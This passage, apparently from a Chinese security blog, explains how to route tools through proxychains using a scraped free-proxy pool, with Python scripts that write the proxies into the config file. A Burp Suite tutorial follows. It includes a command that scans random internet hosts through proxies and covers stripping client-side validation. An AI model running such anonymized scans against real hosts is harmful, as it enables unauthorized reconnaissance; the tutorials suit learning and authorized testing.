<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 &lt;运行的命令&gt; &lt;命令参数&gt;</span><br></pre></td></tr></table></figure>

<p>例如：使用Nmap scanner通过代理可以查找web服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -PO -p 80 -iR</span><br></pre></td></tr></table></figure>

<p>-q参数可以静默适用代理，不会出现proxychains连接提示。</p>
<h2 id="Proxy-Pool"><a href="#Proxy-Pool" class="headerlink" title="Proxy_Pool"></a>Proxy_Pool</h2><p>Proxy_Pool，一个小巧的代理ip抓取+评估+存储+展示的一体化的工具，可自动化的搜集检测可用代理并进行评分，并添加了web展示和接口。</p>
<p>程序的几个功能：</p>
<p>1、每天从多个代理ip网站上抓下最新高匿ip数据。</p>
<p>2、经过筛选后的ip将存入数据库。</p>
<p>3、存入数据库的ip每天也要经过测试，存在剔除、评分机制，多次不合格的ip将被删除，每个ip都被评分，我们最终可以按得分排名获得稳定、低响应时间的优质ip。</p>
<p>项目地址：<a href="https://github.com/TideSec/Proxy_Pool">https://github.com/TideSec/Proxy_Pool</a></p>
<p>还有另一个推荐的爬虫代理IP池项目：<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p>
<h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>1、安装python2依赖库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">pip install requests</span><br><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure>

<p>2、将源代码从GitHub上下载，把代码放在Web目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/TideSec/Proxy_Pool</span><br><span class="line">mv Proxy_Pool /var/html/www/</span><br><span class="line">cd /var/html/www/Proxy_Pool/</span><br><span class="line">vim include/config.inc.php	# 修改配置中的数据库用户名和密码</span><br><span class="line">cd py_proxy_task/</span><br></pre></td></tr></table></figure>

<p>3、开启mysql或mariadb数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service mariadb start</span><br></pre></td></tr></table></figure>

<p>4、修改配置文件py_proxy_task/config.py（修改数据库用户名、密码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim config.py</span><br></pre></td></tr></table></figure>

<p>5、使用python2运行proxy_get.py爬取代理IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 proxy_get.py</span><br></pre></td></tr></table></figure>

<p>6、使用python2运行proxy_check.py查看代理IP的存活情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 proxy_check.py</span><br></pre></td></tr></table></figure>

<p>7、访问站点</p>
<p><img src="https://i.loli.net/2021/10/05/Gbka1vNJfAnYlqc.png" alt="09d2f1b47ee8e924662b4f4c8118549c.png"></p>
<p>8、Web接口</p>
<p><img src="https://i.loli.net/2021/10/05/RhXt4ZGwEPyQMzp.png" alt="e1d2fce67714788f2e78be5ceb0402a9.png"></p>
<h3 id="将代理池IP自动添加入proxychains配置"><a href="#将代理池IP自动添加入proxychains配置" class="headerlink" title="将代理池IP自动添加入proxychains配置"></a>将代理池IP自动添加入proxychains配置</h3><p>远程添加可以使用Web接口，这里就不使用Web接口了，直接利用数据库中的数据进行添加。</p>
<p>记得提前备份好配置文件。</p>
<p>不多说直接上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> re,time</span><br><span class="line"></span><br><span class="line">db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">db_user = <span class="string">&quot;root&quot;</span></span><br><span class="line">db_pass = <span class="string">&quot;123456&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;proxy&quot;</span></span><br><span class="line">filename = <span class="string">&quot;/etc/proxychains4.conf&quot;</span></span><br><span class="line"></span><br><span class="line">ips = []</span><br><span class="line">ports = []</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">        host=db_host,</span><br><span class="line">        user=db_user,</span><br><span class="line">        password=db_pass,</span><br><span class="line">        database=db_name,</span><br><span class="line">        charset=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">sql = <span class="string">&quot;SELECT content FROM valid_ip&quot;</span></span><br><span class="line">cursor.execute(sql)</span><br><span class="line">results = cursor.fetchall()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    ips.append(re.findall(<span class="string">r&#x27;\d+.\d+.\d+.\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">    ports.append(re.findall(<span class="string">r&#x27;(?&lt;=:)\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;random_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ips)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--&gt; IP: &quot;</span>,ips[i],<span class="string">&quot;  PORT: &quot;</span>,ports[i],<span class="string">&quot; &lt;--&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (filename,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;http  %s  %s\n&quot;</span> %(ips[i],ports[i]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>不过这个代理池很多ip都用不了。</p>
<p>让我们再对脚本做亿点点优化，增加了对端口的存活验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql,socket,threading</span><br><span class="line"><span class="keyword">import</span> re,time,nmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> f</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetProxy</span>:</span></span><br><span class="line">    db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    db_user = <span class="string">&quot;root&quot;</span></span><br><span class="line">    db_pass = <span class="string">&quot;1231414514&quot;</span></span><br><span class="line">    db_name = <span class="string">&quot;proxy&quot;</span></span><br><span class="line">    filename = <span class="string">&quot;/etc/proxychains4.conf&quot;</span></span><br><span class="line">    ips = []</span><br><span class="line">    ports = []</span><br><span class="line">    nm = nmap.PortScanner()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_port</span>(<span class="params">self,ip,port</span>):</span></span><br><span class="line">        <span class="comment">#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">        <span class="comment">#sock.settimeout(5)</span></span><br><span class="line">        <span class="comment">#result = sock.connect_ex((ip,port))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.nm.scan(ip,port)</span><br><span class="line">            result = self.nm[ip][<span class="string">&#x27;tcp&#x27;</span>][<span class="built_in">int</span>(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result==<span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;--&gt; IP: &quot;</span>,ip,<span class="string">&quot;  PORT: &quot;</span>,port,<span class="string">&quot; &lt;--&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.filename, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">&quot;http  %s  %s\n&quot;</span> % (ip, port))</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_sql</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn = pymysql.connect(</span><br><span class="line">                host=self.db_host,</span><br><span class="line">                user=self.db_user,</span><br><span class="line">                password=self.db_pass,</span><br><span class="line">                database=self.db_name,</span><br><span class="line">                charset=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        sql = <span class="string">&quot;SELECT content FROM valid_ip&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        self.results = cursor.fetchall()</span><br><span class="line">        cursor.close()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> self.results:</span><br><span class="line">            self.ips.append(re.findall(<span class="string">r&#x27;\d+.\d+.\d+.\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">            self.ports.append(re.findall(<span class="string">r&#x27;(?&lt;=:)\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span> (self.filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">&quot;random_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n&quot;</span>)</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multi_thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.threads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(self.ips)):</span><br><span class="line">            self.threads.append(</span><br><span class="line">                threading.Thread(target=GetProxy.check_port, args=(self, self.ips[i],self.ports[i],))</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> self.threads:</span><br><span class="line">            thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> self.threads:</span><br><span class="line">            thread.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy = GetProxy()</span><br><span class="line">    proxy.get_sql()</span><br><span class="line">    proxy.get_result()</span><br><span class="line">    proxy.multi_thread()</span><br></pre></td></tr></table></figure>

<p>虽然筛选掉了大部分未存活的主机，但是还是有很多代理连接超时。</p>
<p>总结：天底下没有免费的午餐，免费的不一定就好。有能力的还是选择使用付费代理吧。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Web漏洞扫描器</title>
    <url>/post/c6e2d2e0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h2><p>BurpSuite是用于攻击 web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
<h3 id="Dashboard模块"><a href="#Dashboard模块" class="headerlink" title="Dashboard模块"></a>Dashboard模块</h3><h4 id="新建扫描"><a href="#新建扫描" class="headerlink" title="新建扫描"></a>新建扫描</h4><p>BurpSuite2021 启用了Dashboard，我们可以直接建立而不用从浏览器打开目标网站。</p>
<p><img src="https://i.loli.net/2021/10/05/cSGxqp6AC2YPsXE.png" alt="在这里插入图片描述"> <img src="https://i.loli.net/2021/10/05/CZ6UtyKg7Wj5n3f.png" alt="在这里插入图片描述"></p>
<p>默认情况下是不用设置其他的参数的。</p>
<h4 id="新建实时任务"><a href="#新建实时任务" class="headerlink" title="新建实时任务"></a>新建实时任务</h4><p>实时任务，就是每时每刻都在运行的任务，会实时接收burpsuite的数据进行处理，当然这是可以设定特定的数据进入该任务进行处理的。</p>
<p><img src="https://i.loli.net/2021/10/05/vDnUHAz9EIC57rV.png" alt="在这里插入图片描述"> <img src="https://i.loli.net/2021/10/05/oimwBcxXz9KQNbH.png" alt="在这里插入图片描述"><img src="https://i.loli.net/2021/10/05/gdrRMsYCfNU1ual.png" alt="在这里插入图片描述"></p>
<p>其他的根据情况微调。</p>
<h3 id="Proxy模块"><a href="#Proxy模块" class="headerlink" title="Proxy模块"></a>Proxy模块</h3><p>Burp Proxy 是Burp Suite以用户驱动测试流程功能的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端和服务端之间传输的数据。</p>
<h4 id="Proxy基本使用"><a href="#Proxy基本使用" class="headerlink" title="Proxy基本使用"></a>Proxy基本使用</h4><p>Burp Proxy的使用是一个循序渐进的过程，刚开始使用时，可能并不能很快就获取你所期望的结果，慢慢地当你熟悉了它的功能和使用方法，你就可以用它很好地对一个产品系统做安全能力评估。 一般使用Burp Proxy时，大体涉及环节如下：</p>
<ol>
<li> 首先，确认JRE已经安装好，Burp Suite可以启动并正常运行，且已经完成浏览器的代理服务器配置。</li>
<li> 打开Proxy功能中的Intercept选项卡，确认拦截功能为“Interception is on”状态，如果显示为“Intercept is off”则点击它，打开拦截功能。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/9iOq72V6ITontGJ.png" alt="img"></p>
<ol start="3">
<li>打开浏览器，输入你需要访问的URL(以 <a href="http://baike.baidu.com/">http://baike.baidu.com/</a> 为例)并回车，这时你将会看到数据流量经过Burp Proxy并暂停，直到你点击【Forward】，才会继续传输下去。如果你点击了【Drop】，则这次通过的数据将会被丢失，不再继续处理。</li>
<li>当Burp Suite拦截的客户端和服务器交互之后，我们可以在Burp Suite的消息分析选项卡中查看这次请求的实体内容、消息头、请求参数等信息。消息分析选项视图主要包括以下两项：</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/SDptf9LyPGimX3z.png" alt="image.png"></p>
<ol start="5">
<li>Raw 这是视图主要显示web请求的raw格式，包含请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。你可以通过手工修改这些信息，对服务器端进行渗透测试。</li>
<li>Hex 这个视图显示Raw的二进制内容，你可以通过hex编辑器对请求的内容进行修改。</li>
</ol>
<p>默认情况下，Burp Proxy只拦截请求的消息，普通文件请求如css、js、图片是不会被拦截的，你可以修改默认的拦截选项来拦截这些静态文件，当然，你也可以通过修改拦截的作用域、参数或者服务器端返回的关键字来控制Burp Proxy的消息拦截，这些在后面的章节中我们会进一步的学习。 所有流经Burp Proxy的消息，都会在http history记录下来，我们可以通过历史选项卡，查看传输的数据内容，对交互的数据进行测试和验证。同时，对于拦截到的消息和历史消息，都可以通过右击弹出菜单，发送到Burp的其他组件，如Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer、Extender，进行进一步的测试。如下图所示： <img src="https://i.loli.net/2021/10/05/ZxsOl7a8wuH6zvM.png" alt="img"></p>
<h4 id="BurpSuite2021新特色"><a href="#BurpSuite2021新特色" class="headerlink" title="BurpSuite2021新特色"></a>BurpSuite2021新特色</h4><p>程序新增内置浏览器，可以不用设置浏览器代理，直接从Proxy选项卡下的“Open Browser”就可以使用内置的浏览器就行访问目标，而Burp suite则会默认开始拦截，而且相对于旧版的Burpsuite是直接可以拦截https的网站的。</p>
<h4 id="数据拦截与控制"><a href="#数据拦截与控制" class="headerlink" title="数据拦截与控制"></a>数据拦截与控制</h4><p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off、Action、Comment 以及Highlight构成，它们的功能分别是：</p>
<ul>
<li>Forward的功能是当你查看过消息或者重新编辑过消息之后，点击此按钮，将发送消息至服务器端。</li>
<li>Drop的功能是你想丢失当前拦截的消息，不再forward到服务器端。</li>
<li>Interception is on表示拦截功能打开，拦截所有通过Burp Proxy的请求数据；</li>
<li>Interception is off表示拦截功能关闭，不再拦截通过Burp Proxy的所有请求数据。</li>
<li>Action的功能是除了将当前请求的消息传递到Spider、Scanner、Repeater、Intruder、Sequencer、Decoder、Comparer组件外，还可以做一些请求消息的修改，如改变GET或者POST请求方式、改变请求body的编码，同时也可以改变请求消息的拦截设置，如不再拦截此主机的消息、不再拦截此IP地址的消息、不再拦截此种文件类型的消息、不再拦截此目录的消息，也可以指定针对此消息拦截它的服务器端返回消息。</li>
</ul>
<p>能是指对拦截的消息添加备注，在一次渗透测试中，你通常会遇到一连串的请求消息，为了便于区分，在某个关键的请求消息上，你可以添加备注信息。 <img src="https://i.loli.net/2021/10/05/hmz9BOkgiZXuofy.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/uUEGIoqWkVmTsFx.png" alt="img"></p>
<p>除了Intercept中可以对通过Proxy的消息进行控制外，在可选项设置选项卡Options中也有很多的功能设置也可以对流经的消息进行控制和处理。</p>
<h4 id="客户端请求消息拦截"><a href="#客户端请求消息拦截" class="headerlink" title="客户端请求消息拦截"></a>客户端请求消息拦截</h4><p>客户端请求消息拦截是指拦截客户端发送到服务器端消息的相关配置选项，其界面如下：</p>
<p><img src="https://i.loli.net/2021/10/05/vXVnpGUg4TdoZN5.png" alt="image.png"></p>
<p>主要包含拦截规则配置、错误消息自动修复、自动更新Content-Length消息头三个部分。</p>
<p>如果intercept request based on the follow rules的checkbox被选中，则拦截所有符合勾选按钮下方列表中的请求规则的消息都将被拦截，拦截时，对规则的过滤是自上而下进行的。当然，我们可以根据自己的需求，通过【Up】和【Down】按钮，调节规则所在位置和排序。同时，我们可以点击【Add】添加一条规则，也可以选中一条规则，通过点击【Edit】进行编辑、点击【Remove】进行删除。当我们点击【Add】按钮时，会弹出规则添加的输入对话框，如下图：</p>
<p><img src="https://i.loli.net/2021/10/05/roMcvHOkbh4mGZ9.png" alt="img"></p>
<ol>
<li> 拦截规则添加时，共包含4个输入项。Boolean opertor表示当前的规则与其他规则是与的方式（And）还是或的方式（Or）共存；Match type表示匹配类型，此处匹配类型可以基于域名、IP地址、协议、请求方法、URL、文件类型、参数, cookies, 头部或者内容, 状态码, MIME类型, HTML页面的title等。Match relationship表示此条规则是匹配还是不匹配Match condition输入的关键字。当我们输入这些信息，点击【OK】按钮，则规则即被保存。=</li>
<li> 如果Automatically fix missing的checkbox被选中，则表示在一次消息传输中，Burp Suite会自动修复丢失或多余的新行。比如说，一条被修改过的请求消息，如果丢失了头部结束的空行，Burp Suite会自动添加上；如果一次请求的消息体中，URl编码参数中包含任何新的换行，Burp Suite将会移除。此项功能在手工修改请求消息时，为了防止错误，有很好的保护效果。</li>
<li> 如果Automatically update Content-Length的checkbox被选中，则当请求的消息被修改后，Content-Length消息头部也会自动被修改，替换为与之相对应的值。</li>
</ol>
<h4 id="服务器端返回消息拦截"><a href="#服务器端返回消息拦截" class="headerlink" title="服务器端返回消息拦截"></a>服务器端返回消息拦截</h4><p>服务器端返回消息拦截顾名思义是指拦截服务器端返回的消息的相关配置项，其界面如下：</p>
<p><img src="https://i.loli.net/2021/10/05/ayvRBstEuYQx8oq.png" alt="img"></p>
<h4 id="服务器返回消息修改"><a href="#服务器返回消息修改" class="headerlink" title="服务器返回消息修改"></a>服务器返回消息修改</h4><p><img src="https://i.loli.net/2021/10/05/ygtSWZnpjc8JAX1.png" alt="image.png"></p>
<p>自上而下，每一个选择项分别对应的功能是</p>
<ul>
<li>显示form表单中隐藏字段</li>
<li>高亮显示form表单中隐藏字段</li>
<li>使form表单中的disable字段生效，变成可输入域</li>
<li>移除输入域长度限制</li>
<li>移动JavaScript验证</li>
<li>移动所有的JavaScript</li>
<li>移除标签</li>
<li>转换https超链接为http链接</li>
<li>移除所有cookie中的安全标志</li>
</ul>
<p>通过服务器返回消息修改可选择项的设置，可以方便渗透测试人员在安全评估过程中突破原有的数据限制，更好、更快地检测服务器端的安全性，但实际上用到的不多。</p>
<h4 id="匹配替换"><a href="#匹配替换" class="headerlink" title="匹配替换"></a>匹配替换</h4><p>此项配置主要用来自动替换请求消息和服务器端返回消息中的某些值和文本，它与前文的规则的不同之处还在于支持正则表达式语言。</p>
<p><img src="https://i.loli.net/2021/10/05/nsrzJ6l7EXmgDyF.png" alt="img"></p>
<p>针对的是所有请求包，可以把特定字符替换成其他的字符。</p>
<p>当点击【Add】按钮时，在弹出的匹配或替换规则输入对话框中我们可以看到，它可以对请求和返回消息的消息头，消息体、请求参数名、请求参数值、请求的第一行进行匹配和替换。例如，当我们要替换所有返回消息中的邮箱地址为<a href="mailto:&#116;&#x30;&#100;&#x61;&#x74;&#x61;&#x40;&#x62;&#x75;&#x72;&#x70;&#115;&#117;&#105;&#x74;&#101;&#46;&#99;&#x6f;&#x6d;">&#116;&#x30;&#100;&#x61;&#x74;&#x61;&#x40;&#x62;&#x75;&#x72;&#x70;&#115;&#117;&#105;&#x74;&#101;&#46;&#99;&#x6f;&#x6d;</a>时，可以参考下图的设置填写输入项并保存验证。</p>
<p><img src="https://i.loli.net/2021/10/05/GxIFETiBWMAU4yv.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/bsuBRLTwGeNMKAo.png" alt="img"></p>
<p>支持正则表达式匹配！！！</p>
<h4 id="其他配置项"><a href="#其他配置项" class="headerlink" title="其他配置项"></a>其他配置项</h4><p>其他配置项主要是杂项设置。其界面如下：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/02fd2597299af5a0787e371178c9a732.png" alt="img"></p>
<p>自上而下依次的功能是</p>
<ul>
<li>指定使用HTTP/1.0协议与服务器进行通信 这项设置用于强制客户端采用HTTP/1.0协议与服务器进行通信，一般客户端使用的HTTP协议版本依赖于客户端浏览器，但某些服务器或者应用，必须使用HTTP/1.0协议，此时可勾选此项</li>
<li>指定使用HTTP/1.0协议反馈消息给客户端 目前所有的浏览器均支持HTTP/1.0协议和HTTP/1.1协议，强制指定HTTP/1.0协议主要用于显示浏览器的某些方面的特征，比如，阻止HTTP管道攻击。</li>
<li>设置返回消息头中的“Connection：close” 可用于某些情况下的阻止HTTP管道攻击。</li>
<li>请求消息头中脱掉Proxy-* 浏览器请求消息中，通常会携带代理服务器的相关信息，此选项主要用于清除消息头中的代理服务器信息。</li>
<li>解压请求消息中的压缩文件 某些应用在与服务器端进行交互时，会压缩消息体，勾选此选项，则Burp Suite 会自动解压消息体</li>
<li>解压返回消息中的压缩文件 大多数浏览器支持压缩的消息体，勾选此选项，则Burp Suite 会自动解压被服务器端压缩的消息体</li>
<li>禁用<a href="http://burp/">http://burp</a></li>
<li>允许通过DNS和主机名访问web接口 即允许通过域名或主机名访问Burp Suite</li>
<li>不在浏览器中显示Burp Suite错误 在我们使用Burp Suite时，如果发生了Burp Suite自身的错误，会在浏览器中显示，如果勾选了此项，则不会在浏览器中显示此类错误。</li>
<li>禁用日志到历史和网站地图中 此选项的作用是阻止记录日志到历史和网站地图，在某些情况下可能有用，比如说，通过上游服务器进行认证或者做正则表达式替换时，为了降低内存的消耗，减少日志的储存，你可以勾选此项。</li>
<li>拦截功能开始设置 这个选项主要用来配置intercept功能的生效方式，分为总是生效、 总是失效 、从上一次的Burp Suite中恢复设置3种方式。</li>
</ul>
<h4 id="历史记录History"><a href="#历史记录History" class="headerlink" title="历史记录History"></a>历史记录History</h4><p>Burp Proxy的历史记录由HTTP历史和WebSockets历史两个部分组成。</p>
<p>HTTP历史界面由筛选过滤器、历史记录列表、消息详情3个部分组成。</p>
<p><img src="https://i.loli.net/2021/10/05/JAlzktEWv4hXyxK.png" alt="img"></p>
<p>当我们在做产品系统的安全评估过程中，会在HTTP历史中保存了大量的日志记录，为了更友好的消息管理，Burp提供了筛选过滤器功能。当我们点击HTTP历史标签下发的Filter时，将弹出筛选过滤器界面。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/369f18129e2b54f61f7a672c8e767883.png" alt="img"></p>
<ul>
<li>按照过滤条件的不同，筛选过滤器划分出7个子板块，分别是</li>
<li>按照请求类型过滤 你可以选择仅显示当前作用域的、仅显示有服务器端响应的和仅显示带有请求参数的消息。当你勾选“仅显示当前作用域”时，此作用域需要在Burp Target的Scope选项中进行配置，详细请阅读Burp Target相关章节。</li>
<li>按照MIME类型过滤 你可以控制是否显示服务器端返回的不同的文件类型的消息，比如只显示HTML、css或者图片。此过滤器目前支持HTML、Script、XML、CSS、其他文本、图片、Flash、二进制文件 8种形式。</li>
<li>按照服务器返回的HTTP状态码过滤 Burp根据服务器的状态码，按照2XX,3XX,4XX,5XX分别进行过滤。比如，如果你只想显示返回状态码为200的请求成功消息，则勾选2XX。</li>
<li>按照查找条件过滤 此过滤器是针对服务器端返回的消息内容，与输入的关键字进行匹配，具体的匹配方式，你可以选择 1.正则表达式 2.大小写敏感 3.否定查找 3种方式的任何组合，前面两种匹配方式容易理解，第3种匹配方式是指与关键字匹配上的将不再显示。</li>
<li>按照文件类型过滤 通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅仅显示哪些，另一个是不显示哪些。如果是仅仅显示哪些，在show only的输入框中填写显示的文件类型，同样，如果不显示哪些文件类型，只要在hide的输入框中填写不需要显示的文件类型即可。</li>
<li>按照注解过滤 此过滤器的功能是指，根据每一个消息拦截时候的备注或者是否高亮来作为筛选条件控制哪些消息在历史列表中显示。</li>
<li>按照监听端口过滤 此过滤器通常使用于当我们在Proxy Listeners中多个监听端口时，仅仅显示某个监听端口通信的消息，一般情况下，我们很少用到。</li>
</ul>
<p>现在，我们再看看WebSockets历史选项的功能，从界面上我们可以看出，WebSockets历史所提供的功能和选项是HTTP历史的一个子集，只是因为采用的通信方式的不同，而被独立出来成为一个专门的视图。其功能的使用方式与HTTP历史雷同，此处就不在赘述。</p>
<h3 id="Target模块"><a href="#Target模块" class="headerlink" title="Target模块"></a>Target模块</h3><p>Burp Target 组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息，下面我们就分别来看看Burp Target的三个组成部分。</p>
<h4 id="目标域设置-Target-Scope"><a href="#目标域设置-Target-Scope" class="headerlink" title="目标域设置 Target Scope"></a>目标域设置 Target Scope</h4><p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。总体来说，Target Scope主要使用于下面几种场景中：</p>
<ul>
<li>限制站点地图和Proxy 历史中的显示结果</li>
<li>告诉Burp Proxy 拦截哪些请求</li>
<li>Burp Spider抓取哪些内容</li>
<li>Burp Scanner自动扫描哪些作用域的安全漏洞</li>
<li>在Burp Intruder和Burp Repeater 中指定URL</li>
</ul>
<p>通过Target Scope 我们能方便地控制Burp 的拦截范围、操作对象，减少无效的噪音。在Target Scope的设置中，主要包含两部分功能：允许规则和去除规则。</p>
<p><img src="https://i.loli.net/2021/10/05/O6heAwENfSgBptF.png" alt="img"></p>
<p>其中允许规则顾名思义，即包含在此规则列表中的，视为操作允许、有效。如果此规则用于拦截，则请求消息匹配包含规则列表中的将会被拦截；反之，请求消息匹配去除列表中的将不会被拦截。</p>
<p><img src="https://i.loli.net/2021/10/05/w49agqpOvFi81nG.png" alt="img"></p>
<p>如果想要设置其他的协议或端口等设置，可点</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/700c8ead11de0be4aced10dd88bf9ef8.png" alt="img"></p>
<p>当我们设置了Target Scope （默认全部为允许），使用Burp Proxy进行代理拦截，在渗透测试中通过浏览器代理浏览应用时，Burp会自动将浏览信息记录下来，包含每一个请求和应答的详细信息，保存在Target站点地图中。</p>
<h4 id="站点地图-Site-Map"><a href="#站点地图-Site-Map" class="headerlink" title="站点地图 Site Map"></a>站点地图 Site Map</h4><p>下图所示站点地图为一次渗透测试中，通过浏览器浏览的历史记录在站点地图中的展现结果。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f0dd2f82e923e0aa1b849c51ca992287.png" alt="img"></p>
<p>从图中我们可以看出，Site Map的左边为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。 基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b7a42a1c433e3171e6d321ce28047891.png" alt="img"></p>
<h3 id="Repeater模块"><a href="#Repeater模块" class="headerlink" title="Repeater模块"></a>Repeater模块</h3><p>Burp Repeater作为Burp Suite中一款手工验证HTTP消息的测试工具，通常用于多次重放请求响应和手工修改请求消息的修改后对服务器端响应的消息分析。</p>
